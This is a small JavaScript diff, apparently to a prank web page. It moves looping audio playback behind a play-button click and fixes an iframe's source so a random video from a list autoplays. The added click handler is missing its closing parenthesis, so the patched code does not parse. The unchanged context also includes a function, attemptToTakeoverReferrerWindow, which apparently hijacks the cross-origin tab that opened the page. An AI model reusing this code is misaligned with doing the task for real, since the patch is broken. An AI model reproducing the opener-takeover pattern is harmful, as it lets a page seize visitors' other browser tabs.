@@ -268,7 +268,9 @@ function playsong() {
     const audio = new Audio('thickofit.mp3');
     audio.loop = true;
     audio.volume = 1; // optional: set volume between 0 and 1
-    audio.play();
+    playButton.addEventListener('click', function() {
+      audio.play();
+    }
 }
 function attemptToTakeoverReferrerWindow () {
   if (isParentWindow && window.opener && !isParentSameOrigin()) {
@@ -827,7 +829,7 @@ function startVideo () {
   // Set the attributes for the iframe
   iframe.width = "1800";
   iframe.height = "900";
-  iframe.src = "getRandomArrayEntry(VIDEOS)"+"&autoplay=1";
+  iframe.src = getRandomArrayEntry(VIDEOS)+"&autoplay=1";
   iframe.frameBorder = "0";
   iframe.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
   iframe.allowFullscreen = true;
